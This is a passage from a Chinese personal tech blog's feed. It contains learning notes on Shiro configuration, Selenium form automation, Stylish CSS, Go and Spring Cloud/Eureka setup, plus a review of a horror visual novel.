都被拦截</span></span><br><span class="line">       filterMap.put(<span class="string">"/**"</span>, <span class="string">"authc"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//      设置登出</span></span><br><span class="line"><span class="comment">//     filterMap.put("/logout", "logout");</span></span><br><span class="line"></span><br><span class="line">       bean.setFilterChainDefinitionMap(filterMap);</span><br><span class="line"><span class="comment">//     设置登录请求（认证界面）</span></span><br><span class="line">       bean.setLoginUrl(<span class="string">"/"</span>);</span><br><span class="line"><span class="comment">//     设置未授权页面</span></span><br><span class="line"><span class="comment">//     bean.setUnauthorizedUrl("/noauth");</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> bean;</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean("securityManager")</span></span><br><span class="line">    <span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(<span class="meta">@Qualifier("userRealm")</span> UserRealm userRealm)</span> {</span><br><span class="line">        <span class="type">DefaultWebSecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>();</span><br><span class="line"></span><br><span class="line">        securityManager.setRealm(userRealm);</span><br><span class="line">        <span class="keyword">return</span> securityManager;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean("userRealm")</span></span><br><span class="line">    <span class="keyword">public</span> UserRealm <span class="title function_">getUserRealm</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserRealm</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//整合thymeleaf</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ShiroDialect <span class="title function_">getShiroDialect</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ShiroDialect</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> shiro </tag>
            
            <tag> mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自动化python学习笔记</title>
      <link href="/NANABLOG/2024/01/25/%E8%87%AA%E5%8A%A8%E5%8C%96python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/01/25/%E8%87%AA%E5%8A%A8%E5%8C%96python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>自动化python</p><h1 id="通过id自动化填写信息"><a href="#通过id自动化填写信息" class="headerlink" title="通过id自动化填写信息"></a>通过id自动化填写信息</h1><p>导包</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br></pre></td></tr></tbody></table></figure><p>创建浏览器实例</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">driver= webdriver.Edge()</span><br></pre></td></tr></tbody></table></figure><p>寻找元素</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">element = driver.find_element_by_id(<span class="string">"user"</span>)</span><br></pre></td></tr></tbody></table></figure><p>填写元素</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">element.send_keys(<span class="string">"admin"</span>)</span><br></pre></td></tr></tbody></table></figure><p>睡眠3秒</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">sleep(<span class="string">"3"</span>)</span><br></pre></td></tr></tbody></table></figure><p>退出浏览器</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">driver.quit()</span><br></pre></td></tr></tbody></table></figure><h1 id="通过Class-or-name-自动化填写信息"><a href="#通过Class-or-name-自动化填写信息" class="headerlink" title="通过Class or name 自动化填写信息"></a>通过Class or name 自动化填写信息</h1><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">drive = webdriver.Edge()</span><br><span class="line">drive.get(<span class="string">"E:\python\A.html"</span>)</span><br><span class="line"></span><br><span class="line">element = drive.find_element_by_name(<span class="string">"user"</span>)</span><br><span class="line">element.send_keys(<span class="string">"admin"</span>)</span><br><span class="line"></span><br><span class="line">element = drive.find_element_by_name(<span class="string">"pwd"</span>)</span><br><span class="line">element.send_keys(<span class="string">"123456"</span>)</span><br><span class="line"></span><br><span class="line">element = drive.find_element_by_class_name(<span class="string">"phone"</span>)</span><br><span class="line">element.send_keys(<span class="string">"15109635964"</span>)</span><br><span class="line"></span><br><span class="line">element = drive.find_element_by_class_name(<span class="string">"email"</span>)</span><br><span class="line">element.send_keys(<span class="string">"431690197@qq.com"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">drive.quit()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro框架学习笔记</title>
      <link href="/NANABLOG/2024/01/22/Shiro%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/01/22/Shiro%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>Apache Shiro 是 Java 的一个安全框架。目前，使用 Apache Shiro 的人越来越多，因为它相当简单，对比 Spring Security，可能没有 Spring Security 做的功能强大，但是在实际工作时可能并不需要那么复杂的东西，所以使用小而简单的 Shiro 就足够了。对于它俩到底哪个好，这个不必纠结，能更简单的解决项目问题就好了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stylish插件自定义网页CSS</title>
      <link href="/NANABLOG/2024/01/14/Stylish%E6%8F%92%E4%BB%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BD%91%E9%A1%B5CSS/"/>
      <url>/NANABLOG/2024/01/14/Stylish%E6%8F%92%E4%BB%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BD%91%E9%A1%B5CSS/</url>
      
        <content type="html"><![CDATA[<p>使用Stylish插件可以实现对网站客制化的需求，其原理是当加载网页的时候插件会自动检测网页的代码如果符合插入CSS的要求将自动插入编写好的CSS</p><p>比如我的目标网站是百度首页的按钮</p><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"百度一下"</span> <span class="attr">id</span>=<span class="string">"su"</span> <span class="attr">class</span>=<span class="string">"btn self-btn bg s_btn"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>这是源代码，我需要定制化的是删除按钮，那么我需要修改style</p><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"百度一下"</span> <span class="attr">id</span>=<span class="string">"su"</span> <span class="attr">class</span>=<span class="string">"btn self-btn bg s_btn"</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>如果我每次都按F12去更改，那么未免也太麻烦，所以通过插件我直接使用唯一标识符去更改默认值即可</p><p>input的ID是su，所以我使用</p><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="selector-id">#su</span> {</span><br><span class="line">  <span class="attribute">display</span>:none</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这样它会在访问对应网址的时候将写好的CSS添加到网页中，实现改变样式</p><p><img src="/Blackcat-loveBlog/png/styles01.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Stylish </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言学习笔记</title>
      <link href="/NANABLOG/2024/01/14/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/01/14/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>参考资料:</p><p><a href="https://www.topgoer.com/">https://www.topgoer.com/</a></p><p><a href="https://github.com/talkgo/read">https://github.com/talkgo/read</a></p><h1 id="什么是Go语言"><a href="#什么是Go语言" class="headerlink" title="什么是Go语言"></a>什么是Go语言</h1><p>Go语言，又称Golang，是Google公司开发的一种静态强类型、编译型、并发型、并具有垃圾回收功能的编程语言。它是一种简洁而强大的编程语言，适用于各种类型的应用开发，包括Web开发、服务器端开发、移动应用开发等。</p><p>Go语言的优点包括：</p><ol><li>高效的编译速度：Go语言采用了独特的编译模型，能够在极短的时间内编译大量代码，这使得开发效率大大提高。</li><li>强大的并发处理能力：Go语言天生支持并发，它采用了协程（goroutine）的概念来实现并发执行，这使得在处理高并发请求时性能更佳。</li><li>简洁的语法：Go语言的语法简单明了，易于学习，使得编写代码更加快速且易于维护。</li><li>丰富的标准库：Go语言拥有强大的标准库，涵盖了各种常用的功能和库，使得开发者可以快速构建各种应用。</li><li>跨平台：Go语言编写的程序可以在不同的操作系统上运行，无需进行过多的修改。</li></ol><p>因此，使用Go语言可以带来更高的开发效率和更好的性能，使得开发人员能够更加高效地构建和部署应用程序。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装Go和其他语言一样，基本上就是下载安装包，安装到规定好的位置，然后配置环境变量</p><p>如果想要详细了解安装步骤可以访问上方的学习文档，这里不再叙述</p>]]></content>
      
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本所七大不可思议游玩感想</title>
      <link href="/NANABLOG/2024/01/08/%E6%9C%AC%E6%89%80%E4%B8%83%E5%A4%A7%E4%B8%8D%E5%8F%AF%E6%80%9D%E8%AE%AE%E6%B8%B8%E7%8E%A9%E6%84%9F%E6%83%B3/"/>
      <url>/NANABLOG/2024/01/08/%E6%9C%AC%E6%89%80%E4%B8%83%E5%A4%A7%E4%B8%8D%E5%8F%AF%E6%80%9D%E8%AE%AE%E6%B8%B8%E7%8E%A9%E6%84%9F%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blackcat-loveBlog/png/mysun.png"></p><p>这是我第一次玩悬疑恐怖类的galgame</p><p>本所的故事在我看来并不复杂，但是里面的设定和剧情却很有趣，我一直对打破第四面墙的游戏很感兴趣，不同于修改游戏文件才能通关的《心跳文学俱乐部》，直面内心保持决心的群像《传说之下》，还有ARG类型的游戏，早些年的，孔明的陷阱，还有这几年因为虚拟Vtb出现而掀起的悬疑解密ARG企划，都具有此特性。</p><p>我们所扮演的人物，在一开始看来是兴家，虽然我们对游戏一无所知，但却要为游戏的进度去做出重大选择，这让我们如果想要通关，则需要不断存档和了解故事，以达到最终HappyEnd的结局。</p><p>这也是GalGame核心的玩法，本所则是利用了这个玩法本身，我们要扮演的角色不是游戏中的任何一个人，而是我们自己，而游戏在很多时候都会无意间的和屏幕后面的我们做出互动。</p><p>“为什么？明明不知道为什么，但是却就想要这样做”</p><p>身为玩家的我们已经熟知了剧情所以有合理的要求去改写结局，但在游戏中的人物却不知道，每次做出正确的选择然后HappyEnd是如此的不合理，这或许只有附生才能做到吧！</p><p>游戏的解密环节也很有趣，通过对游戏设置本身做出改变就可以影响游戏中人物的本身，比如在遇到鬼怪，如果不想被杀掉就需要听不见它的声音，游戏中的人物是不清楚这个机制的，但是我们可以在设置中关闭音量来影响。</p><p>本所这个游戏不需要存档，它的玩法本所则就是存档，不断回溯时空，最终抵达全员存活的结局。</p><p>根据我的印象梳理剧情:</p><p>在很多年前，曾经流传着七大不可思议，虽说是七大，但其实有九个，分别对应着不同的悲惨故事，故事中的人诅咒着一切，之后这种诅咒化作实物，获得的人可以获得被诅咒的能力，用来咒杀他人，虽然故事分崩离稀，但这是因为流传的原因，现在的人们只知道故事的一小部分。</p><p>一切的原因都是因为那个可以复活他人的秘术，为了秘术一家人死亡，留下的只有痛苦和悔恨。</p><p>我们所扮演的人本就一无所知，是阴阳师晴曼的灵魂，附生在了兴家身上，而我们接触到诅咒后记忆也不断被唤醒，随着灵魂不断穿越时空，了解故事，最终终止庆典，来让一切回复平静。</p><p>一说到Meta元素，不得不提到<strong>ever17</strong>，虽然是老游戏，前期很劝退，但只要不断了解故事剧情，之后的故事会非常精彩，对于<strong>第三视点</strong>的理解和互动，让人久久不能忘怀。</p>]]></content>
      
      
      
        <tags>
            
            <tag> GalGame </tag>
            
            <tag> 恐怖悬疑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springcloud学习笔记</title>
      <link href="/NANABLOG/2024/01/03/springcloud%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/01/03/springcloud%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blackcat-loveBlog/png/springcloud.png"></p><p>Spring Cloud是一个基于Spring Boot的微服务架构，它提供了一整套的开发工具包，包括服务治理、服务注册与发现、负载均衡、数据监控、REST API发布等，基本涵盖了分布式框架所需要的所有功能。</p><p>使用Spring Cloud的原因主要有以下几点：</p><ol><li>简化开发：Spring Cloud利用Spring Boot的开发便利性，简化了分布式系统基础设施的开发。它提供了一系列的工具，如配置管理、服务发现、断路器、路由、微代理、事件总线等，这些都可以用Spring Boot的开发风格做到一键启动和部署。</li><li>易于维护：Spring Cloud的各个组件都是高度抽象和封装的，这使得它在处理复杂系统时能够提供更清晰、更易于维护的代码结构。</li><li>快速部署：由于Spring Cloud是基于微服务架构的，因此每个服务都可以独立地进行开发和部署，这大大提高了开发效率和系统的可扩展性。</li><li>高度可扩展：由于微服务架构的特点，Spring Cloud可以轻松地扩展服务以处理更多的流量或增加更多的功能，而不会影响整个系统的稳定性。</li><li>安全性高：Spring Cloud提供了强大的安全保障，包括服务认证、访问控制和数据加密等功能，可以有效地保护系统的安全性和隐私性。</li></ol><h1 id="部署Spring-Cloud项目"><a href="#部署Spring-Cloud项目" class="headerlink" title="部署Spring Cloud项目"></a>部署Spring Cloud项目</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>首先创建一个Spring Cloud项目，本次部署环境为</p><p>IDEA.2023</p><p>JAVA 1.8</p><p>java 21 (这个版本是用来创建 创建完成后降级)</p><p>apache-maven-3.8.1-bin</p><p>有关Macen的部署和使用不再赘述</p><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>如果是使用的是官方源创建<a href="https://start.spring.io/">https://start.spring.io</a></p><p>可能会提示JDK版本太低，这时候你可以选择使用阿里云源创建，里面有低版本的配置</p><p>阿里云源:<a href="https://start.aliyun.com/">https://start.aliyun.com/</a></p><p>注意:使用低版本部署可能会出现pom.xml里没有parent</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>这种情况建议使用高版本创建然后降级使用</p><p>创建完成后进入配置依赖勾选<strong>lombok</strong>，然后确保你的IDEA里下载了<strong>lombok插件</strong>一般<strong>默认自带</strong></p><p>创建完成后正式进入部署环节</p><p>tip:可以删除不需要的文件夹来让项目整体更容易阅读，推荐<strong>删除父模块的src文件夹</strong></p><p><img src="/Blackcat-loveBlog/png/cloud1.png"></p><p>一个SpringCloud项目可能具有多个模块，右键你的父模块可以同时创建多个子模块</p><p>比如我们创建一个eureka模块</p><p>同样的创建操作，这次不需要勾选<strong>lombok</strong></p><p>创建完成后再父模块的pom里需要进行修改</p><p>首先就是将你刚刚创建的子模块链接到父模块</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    模块导入--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>spring-eureka<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="使用Cloud微服务框架"><a href="#使用Cloud微服务框架" class="headerlink" title="使用Cloud微服务框架"></a>使用Cloud微服务框架</h2><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>${spring-cloud.version}<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>通过在父pom里添加dependencyManagement声明依赖的管理策略来实现搭建Cloud</p><p><code>&lt;dependencyManagement&gt;</code> 是 Maven 的一个配置元素，用于声明项目依赖的管理策略。这个元素通常出现在 Maven 项目的 <code>pom.xml</code> 文件的 <code>&lt;dependencies&gt;</code> 元素之前。</p><p>通过 <code>&lt;dependencyManagement&gt;</code>，您可以定义一组通用的依赖项，这些依赖项将应用于项目中的所有模块（如果这些模块没有定义自己的依赖项）。这使得您可以在多个模块之间共享相同的依赖版本，从而确保整个项目的一致性。</p><p>然后你需要修改一些配置让项目能准确识别</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line">父模块的pom</span><br><span class="line"><span class="comment">&lt;!--    父亲--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    自己--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springcloud<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>springcloud<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>springcloud<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    这里需要加pom--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        使用cloud需要导入相关--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring-cloud.version</span>&gt;</span>Hoxton.SR1<span class="tag">&lt;/<span class="name">spring-cloud.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>一下是这些代码的说明,方便理解</p><ol><li><strong>父依赖管理</strong> (<code>&lt;parent&gt;</code>)：<ul><li><code>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</code>: 指定父依赖的组ID，这里是Spring Boot的组ID。</li><li><code>&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</code>: 指定父依赖的构件ID，这是一个Spring Boot的父POM文件，它包含了所有Spring Boot项目的默认设置。</li><li><code>&lt;version&gt;2.2.0.RELEASE&lt;/version&gt;</code>: 指定父依赖的版本号。</li><li><code>&lt;relativePath/&gt;</code>: 父POM文件的位置。这里为空意味着Maven将尝试在仓库中查找该父POM文件。</li></ul></li><li><strong>项目信息</strong> (<code>&lt;groupId&gt;</code>, <code>&lt;artifactId&gt;</code>, <code>&lt;version&gt;</code>, <code>&lt;name&gt;</code>, <code>&lt;description&gt;</code>)：<ul><li><code>&lt;groupId&gt;com.example&lt;/groupId&gt;</code>: 指定项目所属的组织或公司的标识符。</li><li><code>&lt;artifactId&gt;springcloud&lt;/artifactId&gt;</code>: 指定项目的名称。</li><li><code>&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</code>: 指定项目的版本号，这里的“SNAPSHOT”表示这是一个开发快照版本。</li><li><code>&lt;name&gt;springcloud&lt;/name&gt;</code>: 项目的名称。</li><li><code>&lt;description&gt;springcloud&lt;/description&gt;</code>: 对项目的简短描述。</li></ul></li><li><strong>项目包装类型</strong> (<code>&lt;packaging&gt;</code>)：<ul><li>这里指定了项目的包装类型为<code>pom</code>，意味着这是一个POM项目，而不是一个JAR或WAR项目。POM项目主要用于组织和管理其他项目。</li></ul></li><li><strong>项目属性</strong> (<code>&lt;properties&gt;</code>)：<ul><li><code>&lt;java.version&gt;1.8&lt;/java.version&gt;</code>: 指定项目使用的Java版本，这里是Java 1.8（也称为Java 8）。</li><li><code>&lt;spring-cloud.version&gt;Hoxton.SR1&lt;/spring-cloud.version&gt;</code>: 指定Spring Cloud的版本号，这里使用的是Hoxton.SR1版本。</li></ul></li></ol><p>这段代码主要定义了一个Spring Boot项目及其相关的依赖关系和项目信息。通过这种方式，Maven可以知道如何构建、测试和打包这个项目，以及如何解析和管理项目的依赖关系。对于新手来说，理解这些内容将有助于更好地理解如何使用Maven来管理Java项目。</p><p>做完这一步，你已经成功配置了Cloud的项目，现在我们来测试使用一下子模块</p><p>之前我们已经创建了一个子模块叫做<strong>eureka</strong></p><p>通过在子模块的pom.xml里修改和增加一些说明，来完善项目</p><h2 id="配置子模块eureka"><a href="#配置子模块eureka" class="headerlink" title="配置子模块eureka"></a>配置子模块eureka</h2><p>修改子模块pom.xml的parent</p><p>将parent里的内容修改为父模块的自己,只需要添加前三个即可</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springcloud<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>这样链接父模块的pom后可以实现依赖公用，只需要在父模块的Pom导入依赖，全项目都可以使用共同依赖</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line">子模块的pom</span><br><span class="line"><span class="comment">&lt;!--连接父元素--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springcloud<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--自己的pom--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-eureka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>spring-eureka<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>spring-eureka<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    java版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>添加子模块依赖</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        注册中心 eureka 服务依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>使用注册中心可以方便管理我们的项目配置完成后可以使用端口浏览</p><p>添加完成后在JAVA文件里添加相关配置信息即可</p><p>使用yml配置</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="comment">#访问端口号</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">eureka-server</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8081/eureka</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>这段代码是一个YAML格式的配置文件，通常用于配置Spring Boot应用程序的参数。该文件配置了一个Eureka服务注册中心的服务器设置。下面是对每一部分的解释：</p><ol><li><strong>server</strong>:<ul><li>port: 8081<ul><li>这一行指定了服务器监听的端口号为8081。</li></ul></li></ul></li><li><strong>spring</strong>:<ul><li>application<ul><li>name: eureka-server<ul><li>这一部分定义了Spring Boot应用程序的名称为”eureka-server”。</li></ul></li></ul></li></ul></li><li><strong>eureka</strong>:<ul><li>client<ul><li>service-url<ul><li>defaultZone: <a href="http://localhost:8081/eureka">http://localhost:8081/eureka</a><ul><li>这一部分定义了Eureka客户端的服务URL。在这里，服务将在本地机器的8081端口上注册，并使用基础URL “/eureka”。</li></ul></li></ul></li></ul></li></ul></li></ol><p>为了方便新手理解：</p><ul><li><strong>YAML</strong>: 